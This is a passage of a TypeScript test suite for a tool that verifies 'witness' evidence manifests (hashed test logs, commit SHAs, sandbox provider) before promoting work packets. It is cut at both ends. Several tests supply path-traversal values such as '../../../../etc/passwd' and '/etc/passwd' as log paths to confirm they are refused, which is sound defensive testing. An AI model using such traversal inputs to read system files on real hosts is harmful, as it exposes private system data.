  // but the per-repo choice belongs to `allowlist.yaml`, and every Wave 1–2 entry there reads
  // `sandbox: e2b` — so on today's allowlist a daytona witness is refused everywhere, and the
  // refusal must say so without blaming the ADR that permits the provider.
  const { state: wave1, id } = reviewingWave1();
  const target = wave1.packets[0];
  assert.equal(repoById(target.repoId)?.sandbox, "e2b");
  const refusedAtGate = applyAttachEvidence(
    wave1,
    id,
    manifestWith(boundWitness("daytona", target.repoId, id)),
    bindingFor(target),
  );
  assert.ok(refusedAtGate.error, "a daytona witness must not attach to an e2b-gated repo");
  assert.match(refusedAtGate.error!, /daytona.*does not match.*sandbox e2b/i);
  assert.match(refusedAtGate.error!, /allowlist\.yaml/);
  assert.doesNotMatch(
    refusedAtGate.error!,
    /does not match [^—]*\(ADR 0003\)/,
    "ADR 0003 states no per-repo equality rule — the refusal must not cite it as the source",
  );
  assert.equal(refusedAtGate.state.packets[0].evidence, undefined);
  assert.ok(
    ALLOWLIST.filter((r) => r.wave >= 1).every((r) => r.sandbox === "e2b"),
    "docs/06-v2.md says every Wave 1–2 entry reads `sandbox: e2b`; if that changes, so must the doc",
  );
});

// --- Witness provenance at the gate, subject binding, and persisted logs (issues #35, #36) ---

/** Wave 1 + `sandbox: e2b`: the promotion gate needs the seed's two attested Wave 0 merges. */
function reviewingWave1(): { state: FactoryState; id: string } {
  const seed = seedState();
  const quiet: FactoryState = {
    ...seed,
    packets: seed.packets.map((p) =>
      p.status === "submitted" ? { ...p, status: "followed-up" as const } : p,
    ),
  };
  const ticked = applyTick(quiet);
  const id = ticked.packet!.id;
  let state = ticked.state;
  state = applyApprove(state, id, "Wave 1 freeze").state;
  state = applyAdvance(state, id).state;
  state = applyAdvance(state, id).state;
  return { state, id };
}

function boundWitness(
  provider: "host" | "e2b" | "daytona",
  repoId: string,
  packetId: string,
  extra: Record<string, unknown> = {},
) {
  return {
    provider,
    testExit: 0,
    revertExit: 1,
    testLogSha: "c".repeat(64),
    revertLogSha: "d".repeat(64),
    ranAt: "2026-08-29T09:00:00.000Z",
    repoId,
    baseSha: BASE,
    headSha: HEAD,
    testLogPath: `docs/evidence/logs/${packetId}/test.log`,
    revertLogPath: `docs/evidence/logs/${packetId}/revert.log`,
    ...extra,
  };
}

function manifestWith(witness: unknown, extra: Record<string, unknown> = {}) {
  return {
    baseSha: BASE,
    headSha: HEAD,
    testCommand: "true",
    testExit: 0,
    negativeControl: "red-on-revert" as const,
    filesChanged: 1,
    diffLines: 1,
    notes: [],
    witness,
    ...extra,
  };
}

test("a host witness on an e2b repo is refused at the gate", () => {
  const { state, id } = reviewingWave1();
  const packet = state.packets[0];
  assert.equal(packet.repoId, "github/awesome-copilot");
  const forged = applyAttachEvidence(
    state,
    id,
    manifestWith(boundWitness("host", packet.repoId, id)),
    bindingFor(packet),
  );
  assert.ok(forged.error, "a host witness must not attach to an e2b repo");
  assert.match(forged.error!, /host witnessing is Wave 0 only \(ADR 0003\)/);
  assert.equal(forged.state.packets[0].evidence, undefined);
  const advanced = applyAdvance(forged.state, id);
  assert.ok(advanced.error);
  assert.equal(advanced.state.packets[0].status, "reviewing");
});

test("an e2b witness on a Wave-0 host repo is refused at the gate", () => {
  const { state, id } = reviewing();
  const packet = state.packets[0];
  assert.equal(packet.repoId, "ravidsrk/orca-fleet");
  const mismatched = applyAttachEvidence(
    state,
    id,
    manifestWith(boundWitness("e2b", packet.repoId, id)),
    bindingFor(packet),
  );
  assert.ok(mismatched.error, "an e2b witness must not attach to a host repo");
  assert.match(mismatched.error!, /e2b.*does not match.*sandbox host|sandbox host.*e2b/i);
  assert.equal(mismatched.state.packets[0].evidence, undefined);
});

test("a witness bound to another repo or another range is refused", () => {
  const { state, id } = reviewing();
  const packet = state.packets[0];

  const foreign = applyAttachEvidence(
    state,
    id,
    manifestWith(boundWitness("host", "ravidsrk/frontguard", id)),
    bindingFor(packet),
  );
  assert.ok(foreign.error, "a witness produced for another repo must not attach");
  assert.match(foreign.error!, /witness was produced for ravidsrk\/frontguard/);

  const otherHead = applyAttachEvidence(
    state,
    id,
    manifestWith(boundWitness("host", packet.repoId, id, { headSha: OTHER })),
    bindingFor(packet),
  );
  assert.ok(otherHead.error, "a witness produced for another head must not attach");
  assert.match(otherHead.error!, /commit range/i);
  assert.match(otherHead.error!, new RegExp(OTHER.slice(0, 7)));

  // #36 says "SHAs", plural, and only the head half of that comparison was exercised: neutering
  // the baseSha half left the suite green. A witness produced for A..HEAD, re-pointed at a
  // manifest claiming B..HEAD, is the same forgery with the other end moved.
  const otherBase = applyAttachEvidence(
    state,
    id,
    manifestWith(boundWitness("host", packet.repoId, id, { baseSha: OTHER })),
    bindingFor(packet),
  );
  assert.ok(otherBase.error, "a witness produced for another base must not attach");
  assert.match(otherBase.error!, /commit range/i);
  assert.match(otherBase.error!, new RegExp(`${OTHER.slice(0, 7)}\\.\\.${HEAD.slice(0, 7)}`));
  assert.equal(otherBase.state.packets[0].evidence, undefined);

  const unbound = applyAttachEvidence(
    state,
    id,
    manifestWith(boundWitness("host", packet.repoId, id, { repoId: undefined })),
    bindingFor(packet),
  );
  assert.ok(unbound.error, "a witness that names no subject must not attach");
  // ...and it is the subject guard that refused it, not an incidental throw on the way there.
  assert.match(unbound.error!, /names no subject/i);
  assert.match(unbound.error!, /repoId, baseSha and headSha/);

  const noLogs = applyAttachEvidence(
    state,
    id,
    manifestWith(boundWitness("host", packet.repoId, id, { testLogPath: undefined })),
    bindingFor(packet),
  );
  assert.ok(noLogs.error, "a witness whose logs were never persisted must not attach");
  assert.match(noLogs.error!, /log/i);
});

test("the gate refuses a witness that points at logs outside its own packet", () => {
  // Provenance and the SHAs can all bind while the log paths point somewhere else entirely —
  // and the direct-state-write path of #36 never passes through the parser, so the gate has to
  // repeat the rule. Before this, `witnessProvenanceViolation` returned nothing for any of these.
  const { state, id } = reviewing();
  const packet = state.packets[0];
  const strays: [string, Record<string, unknown>][] = [
    ["an absolute path", { testLogPath: "/etc/passwd" }],
    ["traversal out of the tree", { revertLogPath: "../../../../outside.log" }],
    ["another packet's log directory", {
      testLogPath: "docs/evidence/logs/pkt_someone_else_1/test.log",
      revertLogPath: "docs/evidence/logs/pkt_someone_else_1/revert.log",
    }],
  ];
  for (const [label, paths] of strays) {
    const stray = applyAttachEvidence(
      state,
      id,
      manifestWith(boundWitness("host", packet.repoId, id, paths)),
      bindingFor(packet),
    );
    assert.ok(stray.error, `${label} must not attach`);
    assert.match(stray.error!, /log path/i, label);
    assert.equal(stray.state.packets[0].evidence, undefined, label);
    // ...and it cannot be promoted around the attach path either.
    const forged: FactoryState = {
      ...state,
      packets: state.packets.map((pk) =>
        pk.id === id
          ? {
              ...pk,
              evidence: {
                ...manifestWith(boundWitness("host", packet.repoId, id, paths)),
                shaVerified: true,
              },
            }
          : pk,
      ),
    };
    assert.equal(evidenceIsReady(forged.packets[0]), false, label);
  }
});

test("a provenanced e2b witness carries a Wave-1 packet to draft-ready", () => {
  const { state, id } = reviewingWave1();
  const packet = state.packets[0];
  const attached = applyAttachEvidence(
    state,
    id,
    manifestWith(boundWitness("e2b", packet.repoId, id)),
    bindingFor(packet),
  );
  assert.equal(attached.error, undefined);
  assert.equal(evidenceIsReady(attached.state.packets[0]), true);
  const advanced = applyAdvance(attached.state, id);
  assert.equal(advanced.error, undefined);
  assert.equal(advanced.state.packets[0].status, "draft-ready");
  assert.equal(advanced.state.packets[0].evidence?.witness?.provider, "e2b");
  assert.ok(advanced.state.packets[0].prBody?.includes(DISCLOSURE));
});

test("witness log hashes are recomputable from disk", async () => {
  const witnessModule = await import("./witness.ts");
  const dir = mkdtempSync(join(tmpdir(), "foundry-logs-"));
  const testLog = "42 passing\n";
  const revertLog = "3 failing\n";
  writeFileSync(join(dir, "test.log"), testLog);
  writeFileSync(join(dir, "revert.log"), revertLog);
  const sha = (text: string) => createHash("sha256").update(text).digest("hex");
  const witness = {
    provider: "e2b" as const,
    testExit: 0,
    revertExit: 1,
    testLogSha: sha(testLog),
    revertLogSha: sha(revertLog),
    ranAt: "2026-08-29T09:00:00.000Z",
    repoId: "github/awesome-copilot",
    baseSha: BASE,
    headSha: HEAD,
    testLogPath: join(dir, "test.log"),
    revertLogPath: join(dir, "revert.log"),
  };
  const read = (p: string) => {
    try {
      return readFileSync(p, "utf8");
    } catch {
      return undefined;
    }
  };
  const good = witnessModule.verifyWitnessLogs(witness, read);
  assert.equal(good.ok, true);

  const lying = witnessModule.verifyWitnessLogs({ ...witness, testLogSha: "0".repeat(64) }, read);
  assert.equal(lying.ok, false);
  if (!lying.ok) assert.match(lying.error, /does not match/i);

  const missing = witnessModule.verifyWitnessLogs(
    { ...witness, revertLogPath: join(dir, "nope.log") },
    read,
  );
  assert.equal(missing.ok, false);
  if (!missing.ok) assert.match(missing.error, /unreadable|not found|missing/i);
});

test("the host witness persists both logs and binds them to its subject", async () => {
  const { runner } = fakeRunner({
    "run-tests@head": { exit: 0, output: "42 passing" },
    "run-tests@revert": { exit: 1, output: "3 failing" },
  });
  const outcome = await witnessEvidence(
    {
      packetId: "pkt_ravidsrk_orca-fleet_71",
      repoId: "ravidsrk/orca-fleet",
      baseSha: BASE,
      headSha: HEAD,
      testCommand: "python3 scripts/validate.py",
      sandbox: "host",
      wave: 0,
    },
    runner,
    {},
  );
  assert.equal(outcome.ok, true);
  if (!outcome.ok) return;
  assert.equal(outcome.witness.repoId, "ravidsrk/orca-fleet");
  assert.equal(outcome.witness.baseSha, BASE);
  assert.equal(outcome.witness.headSha, HEAD);
  assert.equal(outcome.logs.test, "42 passing");
  assert.equal(outcome.logs.revert, "3 failing");
  assert.equal(
    outcome.witness.testLogSha,
    createHash("sha256").update(outcome.logs.test).digest("hex"),
  );
  const read = (p: string) =>
    p === outcome.witness.testLogPath
      ? outcome.logs.test
      : p === outcome.witness.revertLogPath
        ? outcome.logs.revert
        : undefined;
  assert.equal(verifyWitnessLogs(outcome.witness, read).ok, true);
});

test("both worker-host refusals name the ingest verb, in a form the operator can actually type", async () => {
  // #35 is the defect class "a refusal points at a path the operator cannot take". `foundry` is an
  // npm script name in a `private: true` package with no `bin`, so a refusal spelling
  // `foundry attach-witness ...` reintroduces the defect one layer down. Assert the real form.
  const subject = {
    packetId: "pkt_github_awesome-copilot_2684",
    repoId: "github/awesome-copilot",
    baseSha: BASE,
    headSha: HEAD,
    testCommand: "true",
    sandbox: "e2b" as const,
    wave: 1 as const,
  };
  const noop = (async () => ({ exit: 0, output: "" })) as never;
  const withKey = await witnessEvidence(subject, noop, { E2B_API_KEY: "present" });
  // The operator *without* a key hits this one first, and the way forward is the same verb.
  const withoutKey = await witnessEvidence(subject, noop, {});

  for (const [label, refused] of [["key present", withKey], ["no key", withoutKey]] as const) {
    assert.equal(refused.ok, false, label);
    if (refused.ok) continue;
    assert.match(refused.error, /attach-witness/, label);
    assert.ok(
      refused.error.includes(`node --experimental-strip-types factory/cli.ts attach-witness ${subject.packetId} --manifest <path>`),
      `${label}: ${refused.error}`,
    );
    assert.doesNotMatch(refused.error, /`foundry attach-witness/, label);
  }

  // ...and the invocation the refusals print is one the binary actually answers to.
  const help = spawnSync(
    process.execPath,
    ["--experimental-strip-types", join(import.meta.dirname, "cli.ts"), "--help"],
    { encoding: "utf8" },
  );
  assert.equal(help.status, 0, `${help.stdout}${help.stderr}`);
  assert.match(help.stdout, /attach-witness <packetId> --manifest <path>/);

  // The reason `foundry` is not one: nothing in this package puts it on a PATH. Asserted against
  // the manifest rather than the machine, so it holds wherever the suite runs.
  const pkg = JSON.parse(readFileSync(join(import.meta.dirname, "..", "package.json"), "utf8"));
  assert.equal(pkg.private, true);
  assert.equal(pkg.bin, undefined, "a `bin` would make `foundry ...` real — then the pointers may use it");
});

test("an ingested witness manifest is parsed strictly, never trusted by shape alone", async () => {
  const { parseWitnessManifest } = await import("./witness.ts");
  const PKT = "pkt_github_awesome-copilot_2684";
  const good = JSON.stringify({
    ...boundWitness("e2b", "github/awesome-copilot", PKT),
    testCommand: "true",
    notes: ["produced on the worker host"],
  });
  const parsed = parseWitnessManifest(good, PKT);
  assert.equal(parsed.ok, true);
  if (parsed.ok) {
    assert.equal(parsed.manifest.witness.provider, "e2b");
    assert.equal(parsed.manifest.testCommand, "true");
    assert.deepEqual(parsed.manifest.notes, ["produced on the worker host"]);
    assert.equal(parsed.manifest.witness.testLogPath, `docs/evidence/logs/${PKT}/test.log`);
  }

  // Every guard the parser states, not a sample of them: the test's name claims strictness, so
  // each rule gets a case that dies if the rule is deleted.
  const mutate = (change: (o: Record<string, unknown>) => void): string => {
    const o = JSON.parse(good);
    change(o);
    return JSON.stringify(o);
  };
  const refusals: [string, string, RegExp][] = [
    ["not JSON at all", "{", /not JSON/i],
    ["a JSON array", "[]", /must be a JSON object/i],
    ["a JSON scalar", '"witnessed, honest"', /must be a JSON object/i],
    ["an unknown provider", mutate((o) => { o.provider = "laptop"; }), /provider must be one of/i],
    ["a non-numeric testExit", mutate((o) => { o.testExit = "0"; }), /exit codes as numbers/i],
    ["a missing revertExit", mutate((o) => { delete o.revertExit; }), /exit codes as numbers/i],
    ["a malformed testLogSha", mutate((o) => { o.testLogSha = "nope"; }), /testLogSha must be a sha256/i],
    ["a truncated revertLogSha", mutate((o) => { o.revertLogSha = "ab"; }), /revertLogSha must be a sha256/i],
    ["no ranAt", mutate((o) => { delete o.ranAt; }), /must record ranAt/i],
    ["a blank repoId", mutate((o) => { o.repoId = "   "; }), /must name the repoId/i],
    ["a short baseSha", mutate((o) => { o.baseSha = "abc123"; }), /baseSha must be a full 40-hex/i],
    ["a ref instead of a headSha", mutate((o) => { o.headSha = "HEAD"; }), /headSha must be a full 40-hex/i],
    ["no revertLogPath", mutate((o) => { delete o.revertLogPath; }), /must reference the persisted run logs/i],
    ["no testCommand", mutate((o) => { delete o.testCommand; }), /must record the testCommand/i],
  ];
  for (const [label, raw, message] of refusals) {
    const result = parseWitnessManifest(raw, PKT);
    assert.equal(result.ok, false, `a manifest with ${label} must be refused`);
    if (!result.ok) assert.match(result.error, message, label);
  }

  // `notes` is the one tolerant field by design — a non-array, or an array of non-strings, is
  // dropped rather than refused, and the manifest still parses.
  for (const junk of [{ notes: "a string" }, { notes: [1, 2] }, { notes: undefined }]) {
    const loose = parseWitnessManifest(mutate((o) => Object.assign(o, junk)), PKT);
    assert.equal(loose.ok, true, `notes=${JSON.stringify(junk.notes)} must not refuse the manifest`);
    if (loose.ok) assert.deepEqual(loose.manifest.notes, []);
  }
});

test("a manifest may name only this packet's own log paths, and the parser settles that before the read", async () => {
  // The manifest is operator-supplied file content, and `attach-witness` reads whatever these
  // paths name straight off disk. Before this, `parseWitnessManifest` accepted
  // `../../../../etc/passwd` — the rule docs/10-schemas.md already stated was never enforced.
  const { parseWitnessManifest, witnessLogPathViolation } = await import("./witness.ts");
  const PKT = "pkt_github_awesome-copilot_2684";
  const raw = (paths: Record<string, unknown>) =>
    JSON.stringify({
      ...boundWitness("e2b", "github/awesome-copilot", PKT),
      testCommand: "true",
      ...paths,
    });

  const strays: [string, Record<string, unknown>][] = [
    ["traversal out of the tree", { testLogPath: "../../../../etc/passwd" }],
    ["an absolute path", { testLogPath: "/etc/passwd" }],
    ["a revert log outside the tree", { revertLogPath: "../../../../outside.log" }],
    ["another packet's directory", {
      testLogPath: "docs/evidence/logs/pkt_someone_else_1/test.log",
      revertLogPath: "docs/evidence/logs/pkt_someone_else_1/revert.log",
    }],
    ["the right directory, the wrong filename", { testLogPath: `docs/evidence/logs/${PKT}/passwd` }],
  ];
  for (const [label, paths] of strays) {
    const result = parseWitnessManifest(raw(paths), PKT);
    assert.equal(result.ok, false, `${label} must be refused before anything is read`);
    if (!result.ok) assert.match(result.error, /log path/i, label);
  }

  assert.equal(parseWitnessManifest(raw({}), PKT).ok, true, "the canonical paths must still parse");
  // And a real run always satisfies the rule, so the check costs the honest path nothing.
  const { witnessLogPaths } = await import("./witness.ts");
  assert.equal(witnessLogPathViolation(PKT, witnessLogPaths(PKT)), undefined);
});

test("an ingested manifest may carry a toolchain, and may not carry a junk one", async () => {
  // Optional in both directions on purpose. Every witness produced before #41 has no `toolchain`
  // and must still ingest; a witness that has one must not be able to smuggle a non-string into
  // the ledger, where `renderEvidencePage` interpolates it into the maintainer's page.
  const { parseWitnessManifest } = await import("./witness.ts");
  const PKT = "pkt_github_awesome-copilot_2684";
  const raw = (extra: Record<string, unknown>) =>
    JSON.stringify({
      ...boundWitness("e2b", "github/awesome-copilot", PKT, extra),
      testCommand: "true",
    });

  const carried = parseWitnessManifest(raw({ toolchain: "python3 3.14.7" }), PKT);
  assert.equal(carried.ok, true);
  if (carried.ok) assert.equal(carried.manifest.witness.toolchain, "python3 3.14.7");

  const absent = parseWitnessManifest(raw({}), PKT);
  assert.equal(absent.ok, true);
  if (absent.ok) assert.equal(absent.manifest.witness.toolchain, undefined);

  for (const junk of [{ toolchain: 12 }, { toolchain: { node: "24" } }, { toolchain: "   " }]) {
    const result = parseWitnessManifest(raw(junk), PKT);
    assert.equal(result.ok, false, `${JSON.stringify(junk)} must be refused`);
    if (!result.ok) assert.match(result.error, /toolchain/i);
  }
});

test("the evidence page tells the maintainer where the hashed logs are", () => {
  const { state, id } = reviewingWave1();
  const packet = state.packets[0];
  const attached = applyAttachEvidence(
    state,
    id,
    manifestWith(boundWitness("e2b", packet.repoId, id)),
    bindingFor(packet),
  );
  assert.equal(attached.error, undefined);
  const page = renderEvidencePage(attached.state.packets[0]);
  assert.match(page, new RegExp(`docs/evidence/logs/${id}/test\\.log`));
  assert.match(page, new RegExp(`docs/evidence/logs/${id}/revert\\.log`));
  // A bare relative path resolves to nothing in an upstream maintainer's own tree, and the page is
  // written for them (ADR 0005). The recompute offer has to name the repo the logs are committed in.
  assert.match(page, /Recompute it yourself/);
  // Pinned verbatim, not against itself: `page.includes(FOUNDRY_REPO_URL)` held for any value the
  // constant could take, so repointing it at `https://example.invalid/` stayed green. A URL the
  // reader cannot follow is #35's defect class, which is why INGEST_INVOCATION is pinned the same
  // way — the assertion has to know what the right answer is.
  assert.equal(FOUNDRY_REPO_URL, "https://github.com/ravidsrk/oss-foundry");
  assert.ok(page.includes("https://github.com/ravidsrk/oss-foundry"), page);
  assert.match(page, /not yours/);
  assert.match(page, new RegExp(`shasum -a 256 docs/evidence/logs/${id}/test\\.log`));
});

test("the evidence page names the toolchain the green was produced by, when the witness knows it", () => {
  // The fact issue #41 cost an operator three hours to establish by hand: *which* interpreter
  // produced this exit 0. A maintainer reading the page has the same question and no shell on our
  // machine, so a witness that resolved it prints it; one that did not says nothing rather than
  // implying the question was asked.
  const { state, id } = reviewingWave1();
  const packet = state.packets[0];
  const withTool = applyAttachEvidence(
    state,
    id,
    manifestWith(boundWitness("e2b", packet.repoId, id, { toolchain: "python3 3.14.7" })),
    bindingFor(packet),
  );
  assert.equal(withTool.error, undefined);
  assert.match(renderEvidencePage(withTool.state.packets[0]), /python3 3\.14\.7/);

  const without = applyAttachEvidence(
    state,
    id,
    manifestWith(boundWitness("e2b", packet.repoId, id)),
    bindingFor(packet),
  );
  assert.equal(without.error, undefined);
  assert.doesNotMatch(renderEvidencePage(without.state.packets[0]), /toolchain/i);
});

test("a witness forged straight into the ledger is refused at the promotion gate", () => {
  // The attack in #36: a hand-written witness that never passed through applyAttachEvidence,
  // exactly as a state file edited outside the CLI would present it.
  const { state, id } = reviewingWave1();
  const packet = state.packets[0];
  const forgedLedger: FactoryState = {
    ...state,
    packets: state.packets.map((p) =>
      p.id === id
        ? {
            ...p,
            evidence: {
              ...manifestWith(boundWitness("host", packet.repoId, id)),
              shaVerified: true,
            },
          }
        : p,
    ),
  };
  assert.equal(evidenceIsReady(forgedLedger.packets[0]), false);
  const advanced = applyAdvance(forgedLedger, id);
  assert.ok(advanced.error, "a forged host witness must not promote a Wave-1 packet");
  assert.match(advanced.error!, /host witnessing is Wave 0 only \(ADR 0003\)/);
  assert.equal(advanced.state.packets[0].status, "reviewing");
});

// --- The ingest verb, driven as the real binary (issues #35, #36) ---
//
// Every assertion above this line is at the reducer/parser level, and the whole `attach-witness`
// handler could be deleted from cli.ts with the suite staying green — including the test that
// asserts the refusal *names* the verb, which passed against a verb that need not exist. That is
// #35's own defect blessed by a green test. These drive `node cli.ts attach-witness` for real.

/** The one network call on the ingest path, stubbed in the child so the test needs no GitHub. */
function writeCompareStub(dir: string, issueNumber: number, filesChanged = 1): string {
  const stub = join(dir, "stub-github.mjs");
  const canned = {
    status: "ahead",
    ahead_by: 1,
    behind_by: 0,
    files: Array.from({ length: filesChanged }, () => ({ additions: 1, deletions: 0 })),
    commits: [{ commit: { message: `docs: close the reference gaps\n\nFixes #${issueNumber}` } }],
  };
  writeFileSync(
    stub,
    `const canned = ${JSON.stringify(canned)};\n` +
      `globalThis.fetch = async (url) => {\n` +
      `  const u = String(url);\n` +
      `  if (u.includes("/compare/")) {\n` +
      `    return new Response(JSON.stringify(canned), { status: 200, headers: { "content-type": "application/json" } });\n` +
      `  }\n` +
      `  throw new Error("unstubbed fetch: " + u);\n` +
      `};\n`,
  );
  return stub;
}

function runCli(dir: string, args: string[], stub?: string, env: Record<string, string> = {}) {
  const nodeArgs = ["--experimental-strip-types"];
  if (stub) nodeArgs.push("--import", pathToFileURL(stub).href);
  // `--state` is what isolates this, not `cwd`: the ledger path is anchored to the repo root, so a
  // spawned CLI left to its default would read and write the developer's real state file no matter
  // which temp directory it was started in. Every fixture here writes its ledger to
  // `<dir>/.foundry-state.json`, so point the child at that one unless a caller is deliberately
  // exercising some other path. `cwd` still matters — the witness log paths are relative to it.
  const stateArgs = args.includes("--state") ? [] : ["--state", join(dir, ".foundry-state.json")];
  nodeArgs.push(join(import.meta.dirname, "cli.ts"), ...args, ...stateArgs);
  const run = spawnSync(process.execPath, nodeArgs, {
    cwd: dir,
    encoding: "utf8",
    env: { ...process.env, ...env },
  });
  return { ...run, seen: `${run.stdout}${run.stderr}` };
}

/**
 * A temp tree the CLI can be pointed at: the ledger with a Wave-1 packet in `reviewing`, the two
 * run logs where the schema says they live, and a manifest naming them.
 */
function ingestFixture(
  overrides: Record<string, unknown> = {},
  logOverrides: Partial<{ test: string; revert: string }> = {},
  filesChanged = 1,
) {
  const dir = mkdtempSync(join(tmpdir(), "foundry-ingest-"));
  const { state, id } = reviewingWave1();
  const packet = state.packets[0];
  writeFileSync(join(dir, ".foundry-state.json"), JSON.stringify(state));

  const testLog = logOverrides.test ?? "42 passing\n";
  const revertLog = logOverrides.revert ?? "3 failing\n";
  const logDir = join(dir, "docs", "evidence", "logs", id);
  mkdirSync(logDir, { recursive: true });
  writeFileSync(join(logDir, "test.log"), testLog);
  writeFileSync(join(logDir, "revert.log"), revertLog);

  const sha = (text: string) => createHash("sha256").update(text).digest("hex");
  const manifest = {
    ...boundWitness("e2b", packet.repoId, id),
    testLogSha: sha("42 passing\n"),
    revertLogSha: sha("3 failing\n"),
    testCommand: repoById(packet.repoId)!.testCommand,
    notes: ["produced on the worker host"],
    ...overrides,
  };
  const manifestPath = join(dir, "witness.json");
  writeFileSync(manifestPath, JSON.stringify(manifest));
  return {
    dir,
    id,
    packet,
    manifestPath,
    stub: writeCompareStub(dir, packet.issueNumber, filesChanged),
  };
}

function ledgerAt(dir: string): FactoryState {
  const loaded = loadFactoryState(join(dir, ".foundry-state.json"));
  assert.equal(loaded.ok, true);
  return loaded.state;
}

test("the attach-witness verb exists and carries a legitimate manifest into the ledger", () => {
  const { dir, id, manifestPath, stub } = ingestFixture();
  assert.equal(ledgerAt(dir).packets[0].evidence, undefined, "nothing attached before the run");

  const run = runCli(dir, ["attach-witness", id, "--manifest", manifestPath], stub);
  assert.equal(run.status, 0, run.seen);
  assert.match(run.stdout, new RegExp(`witness ingested ${id} \\(e2b\\)`));
  // The hashes were recomputed from the logs on disk, and it says so before touching the network.
  assert.match(run.seen, /log hashes recomputed from disk/);

  const after = ledgerAt(dir).packets[0];
  assert.equal(after.evidence?.witness?.provider, "e2b");
  assert.equal(after.evidence?.witness?.baseSha, BASE);
  assert.equal(after.evidence?.witness?.headSha, HEAD);
  assert.equal(after.evidence?.shaVerified, true);
  assert.ok(after.evidence?.notes.some((n) => n.includes("produced on the worker host")));
  assert.equal(evidenceIsReady(after), true, "an ingested witness must reach the promotion gate");

  // ...and the packet really does promote through the verb the doctrine points the operator at.
  const advanced = runCli(dir, ["advance", id]);
  assert.equal(advanced.status, 0, advanced.seen);
  assert.equal(ledgerAt(dir).packets[0].status, "draft-ready");
});

test("attach-witness refuses a manifest whose testCommand is not the repo's oracle", () => {
  const { dir, id, manifestPath, stub } = ingestFixture({ testCommand: "echo green" });
  const run = runCli(dir, ["attach-witness", id, "--manifest", manifestPath], stub);
  assert.equal(run.status, 1, run.seen);
  assert.match(run.seen, /witness ran `echo green`/);
  assert.match(run.seen, /oracle is `true`/);
  assert.equal(ledgerAt(dir).packets[0].evidence, undefined, "a refusal must not write the ledger");
});

test("attach-witness refuses when a run log on disk is not what was witnessed", () => {
  // The digest is the whole offer the evidence page makes to a maintainer. A log edited after the
  // run — or a hash covering a log nobody has — must not reach the ledger.
  const { dir, id, manifestPath, stub } = ingestFixture({}, { revert: "3 failing (edited)\n" });
  const tampered = runCli(dir, ["attach-witness", id, "--manifest", manifestPath], stub);
  assert.equal(tampered.status, 1, tampered.seen);
  assert.match(tampered.seen, /revert log .* does not match the witness sha256/);
  assert.equal(ledgerAt(dir).packets[0].evidence, undefined);

  const gone = ingestFixture();
  rmSync(join(gone.dir, "docs", "evidence", "logs", gone.id, "test.log"));
  const missing = runCli(gone.dir, ["attach-witness", gone.id, "--manifest", gone.manifestPath], gone.stub);
  assert.equal(missing.status, 1, missing.seen);
  assert.match(missing.seen, /missing or unreadable/);
  assert.equal(ledgerAt(gone.dir).packets[0].evidence, undefined);
});

test("attach-witness refuses a manifest that names logs outside its own packet", () => {
  // Driven end to end because this is the one input that decides which file the CLI opens.
  const { dir, id, manifestPath, stub } = ingestFixture({ testLogPath: "../../../../etc/passwd" });
  const run = runCli(dir, ["attach-witness", id, "--manifest", manifestPath], stub);
  assert.equal(run.status, 1, run.seen);
  assert.match(run.seen, /log path/i);
  assert.doesNotMatch(run.seen, /root:/, "nothing outside the tree may be read, let alone hashed");
  assert.equal(ledgerAt(dir).packets[0].evidence, undefined);
});

test("witnessed run logs are written where the schema says, and land verifiable", async () => {
  // #36's "logs persisted" bullet. The CLI's writer was reachable from no test at all: deleting
  // the call left the suite green, and a digest whose logs were never written is not evidence.
  const { persistWitnessLogs } = await import("./cli.ts");
  const { witnessLogPaths } = await import("./witness.ts");
  const root = mkdtempSync(join(tmpdir(), "foundry-persist-"));
  const { runner } = fakeRunner({
    "run-tests@head": { exit: 0, output: "42 passing" },
    "run-tests@revert": { exit: 1, output: "3 failing" },
  });
  const outcome = await witnessEvidence(
    {
      packetId: "pkt_ravidsrk_orca-fleet_71",
      repoId: "ravidsrk/orca-fleet",
      baseSha: BASE,
      headSha: HEAD,
      testCommand: "python3 scripts/validate.py",
      sandbox: "host",
      wave: 0,
    },
    runner,
    {},
  );
  assert.equal(outcome.ok, true);
  if (!outcome.ok) return;

  persistWitnessLogs(outcome.witness, outcome.logs, root);
  const want = witnessLogPaths("pkt_ravidsrk_orca-fleet_71");
  assert.equal(outcome.witness.testLogPath, want.testLogPath);
  assert.equal(readFileSync(join(root, want.testLogPath), "utf8"), "42 passing");
  assert.equal(readFileSync(join(root, want.revertLogPath), "utf8"), "3 failing");
  // The bytes on disk are what the declared sha256 covers — the maintainer's recompute succeeds.
  const read = (p: string) => {
    try {
      return readFileSync(join(root, p), "utf8");
    } catch {
      return undefined;
    }
  };
  assert.equal(verifyWitnessLogs(outcome.witness, read).ok, true);
});

// --- The `evidence` verb, driven end to end (issue #36) ---
//
// The persist test above calls `persistWitnessLogs` directly, so it locks the function's body and
// nothing else: deleting the call in cli.ts, or moving it back above the `applyAttachEvidence`
// error check that it was moved below, both left the suite green. No test drove the `evidence`
// verb at all. The version that shipped green never writes the logs, so `attach-witness` later
// refuses `missing or unreadable` and the evidence page's "Recompute it yourself" line points at
// files nobody has — #36's defect, restored.
//
// So these run the real verb: a real clone, the repo's real test command, both runs, on a local
// origin the child is pointed at with `GIT_CONFIG_GLOBAL` + `url.insteadOf`. Only `compareCommits`
// is stubbed, exactly as the ingest tests do.

/**
 * The `evidence` fixtures' temp trees, removed when the file's tests are done.
 *
 * Each of these is a git repo or a work tree with a clone in it, not a stray file, and the two
 * tests added below create one apiece on every run. `mkdtempSync` with no counterpart is how a
 * developer's `$TMPDIR` acquires hundreds of them; the same omission in `witness-host.test.ts` had
 * left ~65 shim directories behind by the time this unit was reviewed. Registered rather than
 * removed per-test because `wave0Origin` is built once and shared by every fixture.
 */
const evidenceScratch: string[] = [];
function evidenceScratchDir(prefix: string): string {
  const dir = mkdtempSync(join(tmpdir(), prefix));
  evidenceScratch.push(dir);
  return dir;
}
after(() => {
  for (const dir of evidenceScratch) rmSync(dir, { recursive: true, force: true });
});

/**
 * The environment variable `LOGIN_SHELL_PROFILE` exports and `scripts/validate.py` refuses on.
 *
 * `hostRunner`'s non-login contract had a test (`witness-host.test.ts`) and the operator's path
 * had none: the single `hostRunner,` argument at the `evidence` verb's `witnessEvidence` call was
 * held by nothing. Substituting a `bash -lc` runner there reintroduced issue #41 on the only path
 * an operator actually runs, with the suite green, because this fixture's `scripts/validate.py`
 * was `sys.exit(0)` — green under every shell by construction, so it could not discriminate.
 */
const LOGIN_SHELL_MARKER = "FOUNDRY_WITNESS_SAW_LOGIN_SHELL";

/**
 * A `~/.bash_profile` + `~/.profile` pair exporting {@link LOGIN_SHELL_MARKER}, written into a
 * `HOME` the CLI child is pointed at.
 *
